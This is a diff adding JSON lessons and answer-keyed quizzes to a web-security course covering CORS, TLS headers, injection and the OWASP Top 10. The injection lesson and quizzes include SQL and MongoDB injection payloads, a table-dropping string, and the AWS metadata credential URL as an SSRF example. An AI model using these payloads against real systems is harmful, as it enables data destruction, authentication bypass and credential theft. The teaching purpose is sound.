+          "body": "The **same-origin policy** stops scripts on one origin from **reading** responses from another origin. **CORS** (Cross-Origin Resource Sharing) lets a server opt in to cross-origin reads by returning headers like `Access-Control-Allow-Origin`.\n\n- **Simple requests** (GET/HEAD/POST with only safelisted headers and content types like `text/plain` or form encodings) are sent directly; the browser then blocks JS from reading the response if CORS headers do not allow it.\n- Other requests (PUT, DELETE, JSON content type, custom headers like Authorization) trigger a **preflight** `OPTIONS` request first with `Access-Control-Request-Method/Headers`. The real request is only sent if the preflight response allows it. `Access-Control-Max-Age` caches preflights.\n- **Credentials** (cookies) require `credentials: \"include\"` on the client and `Access-Control-Allow-Credentials: true` on the server, and then `Access-Control-Allow-Origin` must be an **explicit origin**, not `*`.\n\nCORS is enforced by **browsers** to protect users; it is not server-side access control. curl, servers and attackers' scripts outside the browser ignore it. And CORS does not stop CSRF: simple requests are still **sent** even when the response is unreadable.",
+          "code": {
+            "lang": "js",
+            "source": "import cors from \"cors\";\n\nconst allowlist = [\"https://app.example.com\", \"https://admin.example.com\"];\napp.use(cors({\n  origin: (origin, cb) => cb(null, !origin || allowlist.includes(origin)),\n  credentials: true,\n  methods: [\"GET\", \"POST\", \"PATCH\", \"DELETE\"],\n  allowedHeaders: [\"Content-Type\", \"Authorization\"],\n  maxAge: 600,\n}));\n// Never: reflect any Origin with credentials: true"
+          }
+        },
+        {
+          "heading": "Common CORS mistakes",
+          "body": "- Reflecting the request's `Origin` header back with `Allow-Credentials: true`: any website can read authenticated responses. That is equivalent to having no same-origin policy.\n- Regex allowlists like `/example\\.com$/` that also match `evilexample.com`.\n- Allowing the `null` origin (sandboxed iframes and some redirects send it, and attackers can produce it).\n- Thinking `Access-Control-Allow-Origin: *` exposes cookie-authenticated data: it does not, because `*` cannot be combined with credentials. It is fine for truly public, unauthenticated resources.\n- Forgetting `Vary: Origin` when the allowed origin varies, which lets caches serve the wrong CORS headers."
+        }
+      ],
+      "keyPoints": [
+        "XSS: untrusted data interpreted as code; types are stored, reflected and DOM-based.",
+        "Rely on framework auto-escaping; audit dangerouslySetInnerHTML, v-html, innerHTML and javascript: URLs.",
+        "Sanitise rich HTML with DOMPurify and add a strict nonce-based CSP as defence in depth.",
+        "CSRF abuses ambient credentials like cookies; Bearer header auth is not vulnerable to classic CSRF.",
+        "CSRF defences: SameSite cookies, tokens, Origin/Sec-Fetch-Site checks, no state changes on GET.",
+        "CORS relaxes the same-origin policy for reads; it is browser-enforced, not access control.",
+        "With credentials, Allow-Origin must be an explicit allowlisted origin, never a reflected one."
+      ],
+      "questions": [
+        {
+          "id": "auth-security-06-q01",
+          "type": "mcq",
+          "prompt": "A comment containing <script> is saved and later runs in every visitor's browser. Which XSS type is this?",
+          "options": [
+            "Reflected",
+            "Stored",
+            "DOM-based",
+            "Self-XSS"
+          ],
+          "answer": 1,
+          "explanation": "The payload persists on the server and is served to other users, which makes stored XSS the most damaging variant."
+        },
+        {
+          "id": "auth-security-06-q02",
+          "type": "mcq",
+          "prompt": "In a React app, which code is vulnerable to XSS if bio comes from users?",
+          "options": [
+            "<p>{bio}</p>",
+            "<p dangerouslySetInnerHTML={{ __html: bio }} />",
+            "<p>{String(bio)}</p>",
+            "<input value={bio} />"
+          ],
+          "answer": 1,
+          "explanation": "React escapes values rendered as children or attributes. dangerouslySetInnerHTML inserts raw HTML, so it must only receive sanitised content."
+        },
+        {
+          "id": "auth-security-06-q03",
+          "type": "mcq",
+          "prompt": "Which statement about CORS is correct?",
+          "options": [
+            "CORS prevents attackers from calling your API with curl",
+            "CORS lets servers allow browsers to read cross-origin responses; non-browser clients ignore it",
+            "CORS encrypts requests",
+            "CORS replaces authentication"
+          ],
+          "answer": 1,
+          "explanation": "CORS is a browser mechanism protecting users. Your API still needs authentication and authorization for every request."
+        },
+        {
+          "id": "auth-security-06-q04",
+          "type": "mcq",
+          "prompt": "A server responds with Access-Control-Allow-Origin set to whatever Origin the request had, and Access-Control-Allow-Credentials: true. What can a malicious site do?",
+          "options": [
+            "Nothing, credentials block it",
+            "Make credentialed requests and read the authenticated responses of logged-in visitors",
+            "Only send requests without reading responses",
+            "Only read public data"
+          ],
+          "answer": 1,
+          "explanation": "Reflecting arbitrary origins with credentials disables the same-origin policy for your API. Use an explicit allowlist."
+        },
+        {
+          "id": "auth-security-06-q05",
+          "type": "mcq",
+          "prompt": "Which request triggers a CORS preflight?",
+          "options": [
+            "GET with no custom headers",
+            "POST with Content-Type: application/x-www-form-urlencoded",
+            "POST with Content-Type: application/json",
+            "HEAD with no custom headers"
+          ],
+          "answer": 2,
+          "explanation": "application/json is not a CORS-safelisted content type, so the browser sends an OPTIONS preflight first. Form encodings and text/plain are allowed for simple requests."
+        },
+        {
+          "id": "auth-security-06-q06",
+          "type": "mcq",
+          "prompt": "An API authenticates only with an Authorization: Bearer header set by JavaScript and uses no cookies. Is it vulnerable to classic CSRF?",
+          "options": [
+            "Yes, always",
+            "No, because a cross-site form or image cannot make the browser attach that header",
+            "Only for GET requests",
+            "Only without HTTPS"
+          ],
+          "answer": 1,
+          "explanation": "CSRF relies on credentials the browser attaches automatically. An attacker's page cannot add your token to the request. XSS, however, could."
+        },
+        {
+          "id": "auth-security-06-q07",
+          "type": "truefalse",
+          "prompt": "Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true lets any site read cookie-authenticated responses.",
+          "answer": false,
+          "explanation": "Browsers refuse that combination: with credentials, the allowed origin must be explicit. The real danger is reflecting arbitrary origins."
+        },
+        {
+          "id": "auth-security-06-q08",
+          "type": "truefalse",
+          "prompt": "With SameSite=Lax session cookies, a GET endpoint that deletes data can still be exploited cross-site.",
+          "answer": true,
+          "explanation": "Lax cookies are sent on top-level GET navigations, so a link or redirect to /delete?id=1 carries the session. State must never change on GET."
+        },
+        {
+          "id": "auth-security-06-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which are effective CSRF defences for a cookie-based web app?",
+          "options": [
+            "SameSite=Lax or Strict cookies",
+            "Synchronizer or signed double-submit CSRF tokens",
+            "Checking Origin or Sec-Fetch-Site on state-changing requests",
+            "Enabling CORS for all origins",
+            "Using POST instead of GET for state changes"
+          ],
+          "answers": [
+            0,
+            1,
+            2,
+            4
+          ],
+          "explanation": "SameSite, tokens, origin checks and not changing state on GET all help. Permissive CORS makes things worse, not better."
+        },
+        {
+          "id": "auth-security-06-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: the browser sends an HTTP ___ request as a CORS preflight.",
+          "accept": [
+            "OPTIONS"
+          ],
+          "explanation": "The preflight is an OPTIONS request with Access-Control-Request-Method and Access-Control-Request-Headers; the server answers with what it allows."
+        },
+        {
+          "id": "auth-security-06-q11",
+          "type": "interview",
+          "prompt": "Explain XSS and how you prevent it in a modern web application.",
+          "answer": "- XSS is injection of attacker-controlled script into pages served from your origin: stored, reflected or DOM-based. The script acts as the user: reads data, calls APIs, steals non-HttpOnly tokens, defaces pages.\n- Prevention: framework auto-escaping everywhere; avoid or audit raw HTML sinks (dangerouslySetInnerHTML, v-html, innerHTML); sanitise necessary HTML with DOMPurify; validate URL schemes for links and redirects; encode for the correct context (HTML, attribute, JS, URL).\n- Defence in depth: strict CSP with nonces or hashes and no unsafe-inline, Trusted Types, HttpOnly cookies, user content on a separate domain, nosniff.\n- Also review third-party scripts (supply chain) since they run with the same privileges.",
+          "level": "intermediate",
+          "top": true
+        },
+        {
+          "id": "auth-security-06-q12",
+          "type": "interview",
+          "prompt": "What is CORS and what is it not? Describe a correct configuration.",
+          "answer": "- The same-origin policy blocks scripts from reading cross-origin responses. CORS is a set of headers through which a server tells browsers which other origins may read its responses, with which methods, headers and whether credentials are allowed. Non-simple requests are preflighted with OPTIONS.\n- It is not authentication or authorization, does not stop non-browser clients, and does not prevent CSRF (simple requests are still sent).\n- Correct config: explicit allowlist of origins (exact strings), credentials only if cookies are needed, minimal methods and headers, Vary: Origin, reasonable max-age, never reflect arbitrary origins or allow null.",
+          "level": "intermediate",
+          "top": true
+        },
+        {
+          "id": "auth-security-06-q13",
+          "type": "interview",
+          "prompt": "How does CSRF work and how do you defend a cookie-based app against it?",
+          "answer": "The attacker's page causes the victim's browser to send a request to your site (form auto-submit, image tag, link). The browser attaches the victim's cookies, so the request is authenticated and performs an action. The attacker cannot read the response but does not need to.\nDefences: SameSite=Lax/Strict cookies; CSRF tokens bound to the session (synchronizer token) or signed double-submit cookies for state-changing requests; verify Origin/Referer or Fetch Metadata (Sec-Fetch-Site) headers; no state changes on GET; require JSON content type with preflight; re-authentication for very sensitive actions. Remember same-site subdomains can bypass SameSite, so tokens or origin checks still matter.",
+          "level": "intermediate"
+        }
+      ],
+      "resources": [
+        {
+          "title": "OWASP Cross Site Scripting Prevention Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        },
+        {
+          "title": "OWASP Cross-Site Request Forgery Prevention Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+        },
+        {
+          "title": "MDN: Cross-Origin Resource Sharing (CORS)",
+          "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS"
+        }
+      ]
+    },
+    {
+      "id": "auth-security-07-tls-headers",
+      "title": "HTTPS, TLS and security headers (CSP, HSTS and friends)",
+      "level": "intermediate",
+      "summary": "What TLS guarantees, how the handshake and certificates work, and the HTTP headers that harden every web app.",
+      "estMinutes": 35,
+      "lesson": [
+        {
+          "heading": "What HTTPS gives you",
+          "body": "HTTPS is HTTP over **TLS**. TLS provides **confidentiality** (encryption), **integrity** (tampering is detected) and **server authentication** (the certificate proves you are talking to the real domain). Without it, anyone on the network path (public Wi-Fi, ISPs, compromised routers) can read passwords and cookies or inject content.\n\nUse **TLS 1.3** (and 1.2 with modern cipher suites as a fallback); disable SSL, TLS 1.0 and 1.1. TLS 1.3 removed legacy algorithms, always uses forward-secret (ephemeral) key exchange, and completes the handshake in one round trip (0-RTT resumption exists but its early data is replayable, so only allow it for idempotent requests)."
+        },
+        {
+          "heading": "Handshake and certificates",
+          "body": "In the TLS 1.3 handshake the client sends supported cipher suites and a key share; the server replies with its key share, its **certificate chain** and a signature proving it holds the private key. Both derive session keys via (EC)DHE, so even if the server's private key leaks later, recorded traffic cannot be decrypted (**forward secrecy**).\n\nThe client validates the certificate: signed by a trusted CA chain, not expired, hostname matches the Subject Alternative Name, and not revoked. Certificates are issued by CAs after domain validation (ACME protocol, e.g. Let's Encrypt), logged in public **Certificate Transparency** logs, and are getting shorter-lived: the CA/Browser Forum has approved reducing maximum validity in steps from 398 days to 47 days by 2029, so automate renewal.\n\n**mTLS** (mutual TLS) also authenticates the client with a certificate; common for service-to-service traffic in zero-trust networks and service meshes."
+        },
+        {
+          "heading": "TLS in Node deployments",
+          "body": "Usually TLS terminates at a load balancer, CDN or reverse proxy (nginx, Envoy, cloud LB), which forwards plain HTTP to Node inside a private network, or re-encrypts. Consequences for your app:\n\n- Configure `trust proxy` so `req.secure`, `req.protocol` and `req.ip` reflect the client, using `X-Forwarded-Proto`/`X-Forwarded-For` from **trusted** proxies only.\n- Redirect HTTP to HTTPS at the edge and send HSTS.\n- For outbound calls, never disable certificate verification (`rejectUnauthorized: false` or `NODE_TLS_REJECT_UNAUTHORIZED=0`) outside local experiments; add private CAs via `NODE_EXTRA_CA_CERTS` or Node 24's `--use-system-ca` instead."
+        },
+        {
+          "heading": "Security headers",
+          "body": "- **Strict-Transport-Security (HSTS)**: `max-age=63072000; includeSubDomains; preload`. Browsers only use HTTPS for the domain for that period, defeating SSL stripping. Preload lists hard-code it into browsers; make sure every subdomain supports HTTPS first.\n- **Content-Security-Policy (CSP)**: allowlists where scripts, styles, images, frames and connections may come from. A strict policy uses per-response **nonces** or hashes with `'strict-dynamic'`, `object-src 'none'`, `base-uri 'none'`. `frame-ancestors` controls who may embed your page. Start with `Content-Security-Policy-Report-Only` to find violations.\n- **X-Content-Type-Options: nosniff**: stop MIME sniffing that turns uploads into scripts.\n- **Clickjacking**: `frame-ancestors 'none'` (or `X-Frame-Options: DENY` for older browsers).\n- **Referrer-Policy: strict-origin-when-cross-origin** (or stricter): avoid leaking full URLs with tokens to other sites.\n- **Permissions-Policy**: disable powerful features you do not use (camera, geolocation).\n- **Cross-Origin-Opener-Policy: same-origin**: isolates your window from cross-origin popups (helps against XS-Leaks and enables cross-origin isolation with COEP).\n- Remove `X-Powered-By`. `X-XSS-Protection` is obsolete; set it to 0 or omit it.\n\nIn Express, **helmet** sets sensible defaults for most of these; tune the CSP for your app.",
+          "code": {
+            "lang": "js",
+            "source": "import helmet from \"helmet\";\nimport crypto from \"node:crypto\";\n\napp.use((req, res, next) => {\n  res.locals.nonce = crypto.randomBytes(16).toString(\"base64\");\n  next();\n});\n\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\"'self'\", (req, res) => \"'nonce-\" + res.locals.nonce + \"'\", \"'strict-dynamic'\"],\n      objectSrc: [\"'none'\"],\n      baseUri: [\"'none'\"],\n      frameAncestors: [\"'none'\"],\n      connectSrc: [\"'self'\", \"https://api.example.com\"],\n    },\n  },\n  strictTransportSecurity: { maxAge: 63072000, includeSubDomains: true, preload: true },\n  referrerPolicy: { policy: \"strict-origin-when-cross-origin\" },\n}));\n// templates: <script nonce=\"<%= nonce %>\">...</script>"
+          }
+        }
+      ],
+      "keyPoints": [
+        "TLS gives confidentiality, integrity and server authentication; use TLS 1.3 (1.2 fallback).",
+        "Ephemeral key exchange gives forward secrecy: past traffic stays safe if keys leak later.",
+        "Certificates are validated by chain, hostname (SAN), expiry and revocation; automate renewal as lifetimes shrink.",
+        "Behind proxies, configure trust proxy and never disable certificate verification on outbound calls.",
+        "HSTS forces HTTPS and blocks SSL stripping; preload with care.",
+        "A strict CSP uses nonces or hashes, no unsafe-inline, object-src none, base-uri none.",
+        "helmet sets most security headers in Express; X-XSS-Protection is obsolete."
+      ],
+      "questions": [
+        {
+          "id": "auth-security-07-q01",
+          "type": "mcq",
+          "prompt": "Which property means recorded TLS traffic cannot be decrypted even if the server's private key is stolen later?",
+          "options": [
+            "Certificate pinning",
+            "Forward secrecy from ephemeral (EC)DHE key exchange",
+            "HSTS",
+            "OCSP stapling"
+          ],
+          "answer": 1,
+          "explanation": "With ephemeral key exchange, session keys are never derivable from the long-term private key, which only signs the handshake. TLS 1.3 makes this mandatory."
+        },
+        {
+          "id": "auth-security-07-q02",
+          "type": "mcq",
+          "prompt": "What attack does HSTS primarily defend against?",
+          "options": [
+            "XSS",
+            "SSL stripping, where an attacker downgrades the user's first HTTP request and keeps them on HTTP",
+            "SQL injection",
+            "CSRF"
+          ],
+          "answer": 1,
+          "explanation": "With HSTS cached (or preloaded), the browser upgrades to HTTPS before any request leaves, so a network attacker cannot intercept a plain HTTP connection."
+        },
+        {
+          "id": "auth-security-07-q03",
+          "type": "mcq",
+          "prompt": "Which CSP is strongest against XSS?",
+          "options": [
+            "script-src * 'unsafe-inline'",
+            "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
+            "script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'",
+            "default-src *"
+          ],
+          "answer": 2,
+          "explanation": "A nonce-based policy only runs scripts carrying the per-response nonce (and scripts they load). unsafe-inline allows injected inline scripts, which defeats most of CSP's XSS protection."
+        },
+        {
+          "id": "auth-security-07-q04",
+          "type": "mcq",
+          "prompt": "Which header prevents your page from being framed by other sites (clickjacking) in modern browsers?",
+          "options": [
+            "Content-Security-Policy: frame-ancestors 'none'",
+            "Referrer-Policy: no-referrer",
+            "X-Content-Type-Options: nosniff",
+            "Access-Control-Allow-Origin"
+          ],
+          "answer": 0,
+          "explanation": "frame-ancestors controls who may embed the page. X-Frame-Options: DENY is the legacy equivalent, still sent for old browsers."
+        },
+        {
+          "id": "auth-security-07-q05",
+          "type": "mcq",
+          "prompt": "A developer sets NODE_TLS_REJECT_UNAUTHORIZED=0 in production to fix a certificate error to an internal service. What is the problem?",
+          "options": [
+            "Performance drops",
+            "All outbound TLS in the process stops verifying certificates, allowing man-in-the-middle attacks",
+            "Node refuses to start",
+            "Only HTTP/2 is affected"
+          ],
+          "answer": 1,
+          "explanation": "It disables verification process-wide. The fix is to trust the internal CA explicitly (NODE_EXTRA_CA_CERTS, the ca option, or --use-system-ca)."
+        },
+        {
+          "id": "auth-security-07-q06",
+          "type": "mcq",
+          "prompt": "Your Node app runs behind a TLS-terminating load balancer. Why might req.secure be false for HTTPS users?",
+          "options": [
+            "The certificate is invalid",
+            "Express sees the plain HTTP hop from the LB unless trust proxy is configured to read X-Forwarded-Proto",
+            "HSTS is missing",
+            "TLS 1.3 hides the protocol"
+          ],
+          "answer": 1,
+          "explanation": "The LB to app connection is HTTP. Express only honours X-Forwarded-* headers from proxies you tell it to trust."
+        },
+        {
+          "id": "auth-security-07-q07",
+          "type": "truefalse",
+          "prompt": "X-XSS-Protection: 1; mode=block is still an important XSS defence in modern browsers.",
+          "answer": false,
+          "explanation": "The XSS auditor was removed from Chrome and never existed in Firefox; the header is obsolete and can even introduce issues. Use CSP and proper encoding instead."
+        },
+        {
+          "id": "auth-security-07-q08",
+          "type": "truefalse",
+          "prompt": "Content-Security-Policy-Report-Only lets you test a policy by reporting violations without blocking anything.",
+          "answer": true,
+          "explanation": "Report-only mode is the safe way to roll out CSP: collect violation reports, fix legitimate sources, then enforce."
+        },
+        {
+          "id": "auth-security-07-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which are good TLS practices?",
+          "options": [
+            "Enable TLS 1.3",
+            "Allow TLS 1.0 for old clients by default",
+            "Automate certificate renewal (ACME)",
+            "Use HSTS on HTTPS sites",
+            "Disable certificate verification for internal calls"
+          ],
+          "answers": [
+            0,
+            2,
+            3
+          ],
+          "explanation": "Modern protocol versions, automated renewal and HSTS are standard. TLS 1.0 is deprecated and verification must stay on; trust internal CAs explicitly."
+        },
+        {
+          "id": "auth-security-07-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: the HTTP header ___ tells browsers to only connect to a site over HTTPS for a given max-age.",
+          "accept": [
+            "Strict-Transport-Security",
+            "HSTS"
+          ],
+          "explanation": "Strict-Transport-Security (HSTS) caches the HTTPS-only rule in the browser for max-age seconds, optionally for all subdomains."
+        },
+        {
+          "id": "auth-security-07-q11",
+          "type": "interview",
+          "prompt": "What happens when you type https://example.com into a browser, from a security perspective?",
+          "answer": "- If example.com is HSTS-preloaded or cached, the browser uses HTTPS without trying HTTP.\n- DNS resolution (ideally DoH/DoT), then TCP (or QUIC for HTTP/3).\n- TLS 1.3 handshake: ClientHello with cipher suites, key share and SNI; server replies with key share, certificate chain and a signature; both derive session keys via ECDHE (forward secrecy).\n- The browser validates the chain to a trusted root, hostname via SAN, validity period, revocation and Certificate Transparency.\n- Encrypted HTTP request with cookies; the response carries security headers (HSTS, CSP, etc.) that the browser enforces for the page.",
+          "level": "intermediate",
+          "top": true
+        },
+        {
+          "id": "auth-security-07-q12",
+          "type": "interview",
+          "prompt": "Which security headers would you set on a web application and why?",
+          "answer": "- Strict-Transport-Security: force HTTPS, block SSL stripping.\n- Content-Security-Policy: strict nonce/hash-based script-src, object-src 'none', base-uri 'none', frame-ancestors 'none'; mitigates XSS and clickjacking. Roll out with Report-Only.\n- X-Content-Type-Options: nosniff: no MIME sniffing.\n- Referrer-Policy: strict-origin-when-cross-origin: no URL leakage.\n- Permissions-Policy: disable unused powerful features.\n- Cross-Origin-Opener-Policy: same-origin (and COEP/CORP where needed): isolation against XS-Leaks.\n- Cache-Control: no-store on sensitive responses; remove X-Powered-By. In Express, helmet covers most defaults.",
+          "level": "intermediate",
+          "top": true
+        },
+        {
+          "id": "auth-security-07-q13",
+          "type": "interview",
+          "prompt": "Explain how certificate validation works and what mTLS adds.",
+          "answer": "The server presents a leaf certificate plus intermediates. The client builds a chain to a root CA in its trust store, verifies each signature, checks validity dates, that the hostname matches a SAN entry, key usage constraints, revocation (OCSP/CRLs, though browsers rely mostly on their own mechanisms and short lifetimes) and, in browsers, Certificate Transparency proofs.\nmTLS adds client authentication: the server requests a client certificate and validates it against a CA it trusts. Used for service-to-service authentication in zero-trust networks, often automated by a service mesh (Istio, Linkerd) issuing short-lived workload certificates, plus some B2B APIs and IoT devices. It authenticates the workload; authorization is still needed on top.",
+          "level": "advanced"
+        }
+      ],
+      "resources": [
+        {
+          "title": "OWASP HTTP Security Response Headers Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html"
+        },
+        {
+          "title": "MDN: Content Security Policy (CSP)",
+          "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP"
+        },
+        {
+          "title": "OWASP Transport Layer Security Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html"
+        }
+      ]
+    },
+    {
+      "id": "auth-security-08-injection-owasp",
+      "title": "Injection attacks and the OWASP Top 10",
+      "level": "advanced",
+      "summary": "SQL and NoSQL injection, command injection and SSRF in Node apps, and a working knowledge of the OWASP Top 10:2025.",
+      "estMinutes": 40,
+      "lesson": [
+        {
+          "heading": "SQL injection",
+          "body": "Injection happens when untrusted data is concatenated into something an interpreter executes. In SQL, input like `' OR '1'='1` changes the query's logic; `'; DROP TABLE users; --` or `UNION SELECT` can read or destroy data.\n\nThe fix is **parameterised queries** (prepared statements): the query text and the values travel separately, so values can never become SQL syntax. ORMs and query builders (Prisma, Drizzle, Kysely, Knex, Sequelize) parameterise by default, but their raw-query escape hatches (`$queryRawUnsafe`, `sequelize.literal`, `knex.raw` with concatenation) do not.\n\nIdentifiers (column names for sorting, table names) cannot be parameters. Map them through an allowlist. Also run the app's DB user with least privilege (no DDL, no superuser) to limit the blast radius.",
+          "code": {
+            "lang": "js",
+            "source": "// Vulnerable\nconst rows = await pool.query(\"SELECT * FROM users WHERE email = '\" + req.query.email + \"'\");\n\n// Safe: parameterised\nconst { rows: safe } = await pool.query(\"SELECT id, email FROM users WHERE email = $1\", [req.query.email]);\n\n// Sorting: identifiers via allowlist\nconst SORTABLE = { name: \"name\", created: \"created_at\" };\nconst col = SORTABLE[req.query.sort] ?? \"created_at\";\nawait pool.query(\"SELECT id, name FROM users ORDER BY \" + col + \" DESC LIMIT $1\", [20]);\n\n// Tagged templates (postgres.js, Prisma $queryRaw) parameterise interpolations safely:\n// await sql`SELECT * FROM users WHERE email = ${email}`"
+          }
+        },
+        {
+          "heading": "NoSQL injection and other injections",
+          "body": "**NoSQL (operator) injection**: in MongoDB, if `req.body.password` is the object `{ \"$ne\": null }` instead of a string, `users.findOne({ email, password: req.body.password })` matches any user. Similar issues exist with `$where` (JavaScript execution) and `$regex`. Defences: validate types with a schema (a string must be a string), strip keys starting with `$` (`mongoose` `sanitizeFilter`), never build queries from raw objects.\n\nOther injection families:\n\n- **OS command injection**: `exec(\"ping \" + host)`; use `execFile`/`spawn` with argument arrays.\n- **Template injection (SSTI)**: rendering user input as a template.\n- **LDAP, XPath, header (CRLF) injection**, and **log injection** (newlines forging log lines).\n- **Prompt injection** in LLM features: untrusted content instructing the model; treat model output as untrusted and limit the tools it can call.",
+          "code": {
+            "lang": "js",
+            "source": "// Vulnerable: body {\"email\":\"a@b.com\",\"password\":{\"$ne\":null}} bypasses login\nconst user = await Users.findOne({ email: req.body.email, password: req.body.password });\n\n// Safe: enforce primitive types before querying\nconst { email, password } = z.object({ email: z.email(), password: z.string().min(1) }).parse(req.body);\nconst found = await Users.findOne({ email });\nconst ok = found && await argon2.verify(found.passwordHash, password);"
+          }
+        },
+        {
+          "heading": "Server-side request forgery (SSRF)",
+          "body": "SSRF occurs when your server fetches a URL influenced by a user (webhooks, link previews, image import, PDF renderers) and the attacker points it at internal targets: cloud metadata (`http://169.254.169.254/` on AWS, which can expose credentials), admin panels, databases or `localhost` services.\n\nDefences: allowlist destinations where possible; otherwise resolve DNS and block private, loopback, link-local and reserved ranges (IPv4 and IPv6), and re-check after redirects (or disable them) and against DNS rebinding by connecting to the validated IP. Run fetchers in an isolated network segment with egress controls, and on AWS require IMDSv2. In the 2025 OWASP Top 10, SSRF is folded into Broken Access Control."
+        },
+        {
+          "heading": "OWASP Top 10:2025",
+          "body": "The OWASP Top 10 is the most cited awareness list of web application risks. The 2025 edition:\n\n- **A01 Broken Access Control** (includes IDOR/BOLA, privilege escalation, CORS misconfig and now SSRF).\n- **A02 Security Misconfiguration** (default credentials, verbose errors, open cloud storage, missing headers).\n- **A03 Software Supply Chain Failures** (new, expands \"vulnerable and outdated components\": compromised packages, build pipelines, dependencies).\n- **A04 Cryptographic Failures** (plaintext data, weak algorithms, bad key management).\n- **A05 Injection** (SQL, NoSQL, OS command, XSS is included here).\n- **A06 Insecure Design** (missing threat modelling and security controls by design).\n- **A07 Authentication Failures** (credential stuffing, weak session handling, missing MFA).\n- **A08 Software or Data Integrity Failures** (unsigned updates, insecure deserialisation, untrusted CI artefacts).\n- **A09 Security Logging and Alerting Failures**.\n- **A10 Mishandling of Exceptional Conditions** (new: failing open, leaking info in errors, unhandled edge cases).\n\nCompared with 2021, Broken Access Control stays first, Security Misconfiguration rises to second, supply chain and exceptional-condition handling are new categories, and SSRF merged into A01. For APIs, also know the separate **OWASP API Security Top 10 (2023)**, led by BOLA, broken authentication and broken object property level authorization."
+        }
+      ],
+      "keyPoints": [
+        "Injection = untrusted data executed by an interpreter; parameterised queries solve SQL injection.",
+        "ORM raw-query escape hatches are not automatically safe; identifiers need allowlists.",
+        "MongoDB operator injection ({\"$ne\": null}) is stopped by strict type validation and stripping $ keys.",
+        "SSRF: block internal destinations after DNS resolution, re-check redirects, isolate fetchers, use IMDSv2.",
+        "OWASP Top 10:2025: A01 Broken Access Control, A02 Security Misconfiguration, A03 Software Supply Chain Failures.",
+        "2025 adds Mishandling of Exceptional Conditions and folds SSRF into Broken Access Control.",
+        "Use least-privilege database users to limit injection impact."
+      ],
+      "questions": [
+        {
+          "id": "auth-security-08-q01",
+          "type": "mcq",
+          "prompt": "Which code is safe from SQL injection?",
+          "options": [
+            "db.query(\"SELECT * FROM t WHERE id = \" + id)",
+            "db.query(`SELECT * FROM t WHERE id = ${id}`) with a plain template string",
+            "db.query(\"SELECT * FROM t WHERE id = $1\", [id])",
+            "db.query(\"SELECT * FROM t WHERE id = '\" + id.replace(\"'\", \"\") + \"'\")"
+          ],
+          "answer": 2,
+          "explanation": "Only the parameterised version separates code and data. Plain template strings are concatenation, and hand-made escaping like removing one quote is easily bypassed."
+        },
+        {
+          "id": "auth-security-08-q02",
+          "type": "mcq",
+          "prompt": "A login does Users.findOne({ email, password: req.body.password }). The attacker sends password: {\"$ne\": null}. What happens?",
+          "options": [
+            "Login fails",
+            "The query matches the user regardless of password",
+            "MongoDB throws a syntax error",
+            "The password is hashed"
+          ],
+          "answer": 1,
+          "explanation": "The object becomes a query operator meaning \"not equal to null\", which matches any stored value. Validate that password is a string (and never store or compare plaintext passwords in queries)."
+        },
+        {
+          "id": "auth-security-08-q03",
+          "type": "mcq",
+          "prompt": "A link preview feature fetches any URL a user submits. Which request is the most dangerous on AWS?",
+          "options": [
+            "https://example.com",
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "https://localhost-shop.com",
+            "ftp://example.com"
+          ],
+          "answer": 1,
+          "explanation": "The instance metadata service can return temporary IAM credentials. IMDSv2 (session tokens) and blocking link-local addresses mitigate this SSRF vector."
+        },
+        {
+          "id": "auth-security-08-q04",
+          "type": "mcq",
+          "prompt": "Which category is ranked first in the OWASP Top 10:2025?",
+          "options": [
+            "Injection",
+            "Cryptographic Failures",
+            "Broken Access Control",
+            "Security Misconfiguration"
+          ],
+          "answer": 2,
+          "explanation": "Broken Access Control remains A01 in 2025, as in 2021. Security Misconfiguration moved up to A02."
+        },
+        {
+          "id": "auth-security-08-q05",
+          "type": "mcq",
+          "prompt": "Which category is new in the OWASP Top 10:2025?",
+          "options": [
+            "Injection",
+            "Software Supply Chain Failures",
+            "Broken Access Control",
+            "Cryptographic Failures"
+          ],
+          "answer": 1,
+          "explanation": "A03 Software Supply Chain Failures broadens 2021's Vulnerable and Outdated Components to cover compromised dependencies, build systems and distribution. A10 Mishandling of Exceptional Conditions is also new."
+        },
+        {
+          "id": "auth-security-08-q06",
+          "type": "mcq",
+          "prompt": "How should you allow user-controlled sorting by column safely?",
+          "options": [
+            "Parameterise the column name with $1",
+            "Map the requested key through an allowlist to a known column name",
+            "Escape quotes in the column name",
+            "Base64-encode the column name"
+          ],
+          "answer": 1,
+          "explanation": "Placeholders bind values, not identifiers. An allowlist ensures only known column names ever reach the SQL text."
+        },
+        {
+          "id": "auth-security-08-q07",
+          "type": "truefalse",
+          "prompt": "Using an ORM like Prisma or Sequelize makes SQL injection impossible in every case.",
+          "answer": false,
+          "explanation": "Normal ORM calls are parameterised, but raw query APIs with string concatenation ($queryRawUnsafe, sequelize.literal, knex.raw with interpolated input) are still injectable."
+        },
+        {
+          "id": "auth-security-08-q08",
+          "type": "truefalse",
+          "prompt": "In the OWASP Top 10:2025, SSRF is no longer a separate category and is included under Broken Access Control.",
+          "answer": true,
+          "explanation": "The 2021 list had SSRF as A10. The 2025 edition merges it into A01 Broken Access Control."
+        },
+        {
+          "id": "auth-security-08-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which defences help against SSRF?",
+          "options": [
+            "Allowlisting destination hosts",
+            "Blocking private, loopback and link-local IPs after DNS resolution",
+            "Re-validating each redirect target",
+            "Using HTTPS for the user-supplied URL",
+            "Isolating the fetcher with egress controls"
+          ],
